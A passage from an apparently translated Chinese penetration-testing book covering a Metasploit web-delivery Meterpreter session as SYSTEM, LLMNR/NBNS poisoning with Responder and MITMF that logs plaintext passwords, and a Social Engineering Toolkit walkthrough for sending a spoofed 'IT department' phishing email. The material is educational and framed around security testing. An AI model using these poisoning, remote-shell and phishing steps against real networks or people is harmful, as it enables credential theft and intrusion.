
[*] Meterpreter session 1 opened (192.168.1.39:4444 -> 192.168.1.93:63741)

msf exploit(multi/script/web delivery) > _

```
一个 Meterpreter 会话已开启！

- 8. 使用 "sessions -i 1" 连接到它
```

msf exploit(multi/script/web delivery) > sessions -i 1

[*] Starting interaction with 1...

```
我们现在拥有了一个目标的完整 Meterpreter shell，并且我们是“System”级用户：
```

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM

meterpreter >

```

如果你需要复习可以输入的 Meterpreter 命令，可以输入 `help` 查看列表：

meterpreter > help
Core Commands

| Command | Description |
|---|---|
| help | 帮助菜单 |
| background | 将会话放入后台 |
| bgkill | 杀死后台 meterpreter 脚本 |
| bglist | 列出后台的脚本 |
| bgrun | 作为后台线程执行 meterpreter 脚本 |
| channel | 显示活动通道 |
| close | 关闭通道 |
| disable_unicode_encoding | 禁用 unicode 编码 |
| enable_unicode_encoding | 启用 unicode 编码 |
| exit | meterpreter 会话 |

你也可以运行 Meterpreter 提供的许多辅助脚本。通过 Responder，Mimikatz 只能获取哈希。但当我运行 Meterpreter 模块 `post/windows/hash` 时，结果更好。正如在本章开头提到的，这最初是我为 Kali 写的的一篇文章。当我正在我的笔记本上运行 Responder 时，Responder 导致服务器通过服务器图片并存储在我的 Kali 上。这很酷吧？完成后，退出 Metasploit 并使用 `Ctrl-c` 退出 Responder 和 Multi-relay。

## 清理 Responder 数据库

如果你的 Multi-relay 攻击没有成功，Responder 将阻止你再次尝试。再次尝试可能无效，因为错误的哈希仍然存储在数据库中。要解决这个问题，你需要退出 Responder，然后手动删除数据库文件 (`Responder.db`) 以及位于 `/usr/share/responder` 中的记录。当重启 Responder 时，`Responder.db` 文件将重新创建，你可以再次尝试。

**警告：** 删除文件要小心，特别是 `Responder.db`，删除 `/usr/share/responder` 中的任何其他可能会破坏你的工具。

这部分非常疯狂。在本章结束之前，让我们转向一些非常简单的内容。在上一章中，我们看到了如何使用 MITMF 进行中间人攻击，现在我们已经看到了 Responder 是如何工作的，我想向你展示如何使用 MITMF 实现同样的功能。

## 使用 MITMF 进行服务投毒

MITMF 是一个很棒的工具，上一章我们没有涵盖的是它实际上包含了 Responder！Responder 允许在 MITMF 中直接进行 LLMNR、NBNS 和 MDNS 投毒。所以，让我们看看如何使用 MITMF 进行基础投毒和凭据收集。

在终端提示符下：

输入 `mitmf -i eth0 --responder --nbtns`
然后 MITMF 会启动 responder：

```
$ Responder online

* Running on http://127.0.0.1:9999/ (按 Ctrl+C 退出)

DNS:0.4 online

* SMB server online

2018-06-28 15:49:49 192.168.1.93 [NBNS] Poisoned answer for name WIN-420RBM3SR (service: Domain Controller)

2018-06-28 15:49:04 192.168.1.93 [LLMNR] Poisoned request for name server

2018-06-28 15:49:04 192.168.1.93 [LLMNR] Poisoned request for name server

2018-06-28 15:49:04 192.168.1.93 [HTTP] - - GET '/'
```

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_232_0.png)

在 Windows 7 系统上，如果你尝试访问不存在的 UNC 路径或打开浏览器（如果仍设置了自动检测代理），你应该得到一个登录提示：如果目标输入凭据，你应该以明文形式获取它们。你还将获得用户密码哈希的副本。数据位于 `/usr/share/mitmf/logs` 目录。如果我们查看 `mitmf.log` 文件，我们应该看到类似的内容：

```
2018-07-02 17:07:28 [Responder] [HTTP] Basic Client : 192.168.1.93

2018-07-02 17:07:28 [Responder] [HTTP] Basic Username : Administrator

2018-07-02 17:07:28 [Responder] [HTTP] Basic Password : AmazingPassword\%202!!
```

所以，只需通过 MITMF 的启动开关，我们就可以轻松地使用 Responder。这有多酷？完成后，按下 `Ctrl-c` 退出。

## 结论

在本章中，我们涵盖了服务投毒工具 Responder。我们看到了它是如何恢复密码哈希和明文密码的。然后我们查看了如何使用 Responder Multi-relay 工具执行“哈希传递”攻击。接下来，我们看到了如何使用 PowerShell 和 Metasploit 从 Multi-relay shell 创建远程 shell。最后，我们看到了 MITMF 内置了 Responder 功能，使其成为一个非常强大的工具。

## 参考文献

- “Introducing Responder MultiRelay 1.0” - 2016年10月13日
- http://g-laurent.blogspot.com/2016/10/introducing-responder-multirelay-10.html
- “MultiResponder 2.0: Runas, Pivot, SVC, and Mimikatz Love” - 2017年3月31日
- http://g-laurent.blogspot.com/2017/03/multirelay-20-runas-pivot-svc-and.html
- “Easy Shells with Web Delivery” - 2015年11月5日
- https://cyberarms.wordpress.com/2015/11/05/easy-remote-shells-with-web-delivery/
- “使用 Responder 和 Kali Linux 快速获取凭据” - 2018年1月12日
- https://cyberarms.wordpress.com/2018/01/12/easy-creds-with-responder-and-kali-linux/

# 第 16 章
## 社会工程导论

社会工程（Social Engineering）是一种通过操纵他人使其产生错误信任，从而从他们那里获取信息、系统访问权限或数据的系统。从本质上讲，社会工程是对人的黑客攻击。精通社会工程的黑客会通过伪装成别人、需要帮助的人，甚至是权威人士，来诱骗你帮助他们，或者授予他们你受保护系统或区域的访问权限。

让我们来看一些例子：

你正进入你的安全数据中心上班。当你靠近门口时，一个两手抱满箱子的快递员也到达了门口。你会做什么？大多数人不会多想，就会为那个负重累行的可怜人开门让他进来。如果他不是真正的快递员，而只是想进入你的安全数据中心呢？你直接让他他进来了。

你坐在自己的工位上，一个穿着衬衫系领带、拿着剪字板和工具箱的人向你走来。他说正在进行系统升级，需要访问你的系统。快到午饭时间了，听起来你将获得一个很长的午假。如果你应该关闭系统呢？他回答说他只需要先检查几样东西。你起身走向食堂，直接给了他访问你系统的权限。

你是一家大公司的 CEO。某一天，你收到一封来自你刚刚签署大额交易的公司的邮件。那是你职业生涯中最大的一笔交易，出现在所有当地报纸和所有电视节目中。你打开包裹，发现里面是最新的平板电脑之一，并附有一封公司的感谢信，感谢你的业务协议。它功能齐全，你迫不及待地将其连接到你的高管 Wi-Fi 网络进行尝试，而你确实做了。该公司从未给你寄过平板电脑，而你刚刚让一个心机勃勃的社会工程师成功连接了你的高管网络。

你收到了公司 IT 经理的一封邮件。他们正在安装一些升级软件，需要你安装一些新驱动程序。他们将软件包作为附件发送，并附有完整的安装说明。你照做了。这封邮件实际上并非来自你的 IT 经理，而你刚刚给了一个远程黑客对你工作站的完全控制权。

社会工程师可能会利用当地习俗、礼仪，利用人类的同情心，或者试图恐吓员工以获得他们想要的东西。他们可能不进行这些直接接触，而是简单地翻找公司的垃圾桶，通过阅读招聘启事或支持人员使用的在线扫描技术论坛来搜寻内部系统的线索。或者，他们也可以在社交媒体网站上伪装成与你有业务往来的公司，或者伪装成寻找新人才的人才猎头机构建立联系。

这些只是社会工程师尝试获取访问权限或获取有关目标网络信息的少数例子。才华横溢的社会工程师试图欺骗、误导或威胁以进入你网络的方法真的没有限制。有一段在 Defcon 期间拍摄的精彩视频，展示了 Real Future 公司的 Kevin Rouge Hadnagy（Social Engineering Inc 创始人）和 Jessica Clark 如何尝试通过社交工程获取他的手机账号并让他提供邮箱地址。Clark 伪造了他的手机号码，给公司打电话假装成他的妻子，并在背景中播放婴儿哭的视频，不仅获得了他的邮箱地址，还获得了他手机账号的完全访问权限。这确实非常令人震撼。

我在 IT 支持部门工作了十五年，你不会相信我见过公司用户做过的那些事情。在那段时间时间里，我可以数出我被要求验证身份的次数，而我当时就在位于纽约和宾夕法尼亚州的大型机构内部。如果你拿着剪字板并系着领带，人们通常会绕开你走。他们在提供信息方面也非常乐于助。我在一家大型制造商处，需要一台需要维护的电脑密码。该用户不在，但那也没办法，部门里的其他用户都知道该用户的密码，并且非常愿意分享给我。

有一次，我因为服务器保修支持的电话出现在了一家大公司。接待台人员不知道我要来，也不知道服务器团队在哪里，所以他们按照他们认为最好的方式来处理。他们把我锁在数据中心里一个小时，直到找到了一位管理员。

更不用说我见过安全数据中心大门被物体挡住、外部访问门被钥匙持有者敞开、接待台无人值且大厅连接着公共访问网络的电脑、密码被公开张贴等等，这些情况列列不完。这些只是可能被社会工程师利用的几种情况的例子。

## 社会工程防御

话虽如此，培训员工警惕这类攻击是非常关键的。要建立策略来处理服务电话、软件更新和来自外部公司的礼品。你可以进行教学、指导，甚至留下提醒信息和张贴海报，但员工可能仍然不会遵守公司政策。这就是为什么，当涉及到社会工程攻击时，手动测试你的公司是否真的准备就绪是一个好主意。现在有很多基于社会工程的工具可用，但在处理重要事情时，你希望使用一个值得信赖的工具。Kali 中包含了其中一个工具。在本章中，我们将查看社会工程工具包（Social Engineering Toolkit）。

## 社会工程工具包

社会工程攻击是目前使用的技术之一。与其花费几天、几周或几个月来渗透层层防御，不如诱骗用户运行一个文件？SET 是目前最流行的工具之一。在本章中，我们将查看一些工具。

### 启动 SET

SET 可以从 Kali 主菜单或终端提示符启动：

- Applications > Social Engineering Tools > Social Engineering Toolkit

或者直接在终端输入 `setoolkit`

### 邮件群攻击 (Mass Emailer)

社会工程师攻击网络的一种方式向公司地址发送邮件，看谁会回复或运行你发送的恶意附件。SET 自带了一个邮件群攻击工具，我们可以用它来模拟。如果你配置了所有设置，该工具实际上会发送邮件，本节将使用虚构信息进行演示。

Social Engineering Toolkit 邮件群攻击

邮件群攻击有两个选项，第一个是向单个个人发送邮件。第二个选项允许你导入列表并向列表中的尽可能多人发送。

你想做什么：

1. E-Mail Attack Single Address
2. E-Mail Attack Mass Mailer
99. 返回主菜单。

## SET

社会工程工具包 (SET)
创建者：David Kennedy (ReLIK)
版本：3.0
代号：Blackout。
关注我们的 Twitter：@trustedSec
关注我们的 Twitter：@nickingave
主页：https://www.trustedsec.com
欢迎来到社会工程工具包 (SET)
你所需的一站式服务

加入 irc.freeden.net 的 #setoolkit 频道

SET 是 TrustedSec 的产品。

访问：https://www.trustedsec.com

SET 呈现主菜单。尽管菜单显示了升级 SET 的选项，但你无法以这种方式在 Kali 中更新它。所有更新现在由 Kali 自动处理。

然后，你可以选择发送单封或多个电子邮件。在本示例中，我们只发送一封。

- 3. 选择选项 1，“E-Mail Attack Single Email Address”（邮件攻击单封邮件地址）。
- 4. 然后输入目标电子邮件地址，我刚刚使用了一个假地址：

```
set:mailer>1

set:phishing> Send email to:MrCE0@SomeRandomDomain.whatever
```

- 5. 接下来，选择一个 Gmail 账户或其他服务器。测试时我们将使用一个 Gmail 账户。因此，我选择了选项“1”，并输入了虚构的名字“EvilHacker@EvilDomain.com”。

- 6. 现在为邮件的“发件人”行选择一个伪造名称。让我们使用“ITDepartment@SomeRandomDomain.com”，让它看起来像是来自公司 IT 部门。

- 7. SET 会提示输入 Gmail 账户密码：

1. 使用 Gmail 账户进行邮件攻击。
2. 使用你自己的服务器或开放中继

```
set:phishing>1

set:phishing> Your email address:EvilHacker@EvilDomain.com

set:phishing> The FROM name the user will see:ITDepartment@SomeRandomDomain.com

Email password:
```

- 8. 在“Flag this message as high priority?”（将此消息标记为高优先级？）提示处输入“yes”。
- 9. 在提示是否附加文件时输入“no”。注意，如果我们想附加一个带有后门的应用程序，这个选项就会出现。
- 10. 在提示附加内联文件时输入“no”——这是另一个可以使用的选项。
- 11. 接下来，输入邮件主题行。例如，“Important Update”（重要更新）。
- 12. 在提示以 html 还是纯文本发送消息时，输入“P”。

现在——输入一条虚假信息，最好是能诱导我们的目标点击恶意网页，或运行我们发送给他们的程序（如果我们附加了附件的话）。在实际防御中，这可以是一个测试网页，用于记录受骗访问该页面的用户的 IP 地址。这样，作为安全团队，我们就知道组织内部需要对恶意邮件的风险进行更好的安全教育。

- 13. 完成后，输入“END”。

```
!! IMPORTANT: When finished, type END (all capitals) then hit (return) on a new line.

Enter:the body of the message, type END (capitals) when finished:

Dear Fake CEO,

我们正在进行更新，需要访问 EvilDomain.com 并输入您所有的个人账户信息，运行网站上的所有程序并包含所有的信用卡号。

Next Line of the body: Sincerely,

Next Line of the body: Your IT Department.

Next line of the body:

Next line of the body: END
```
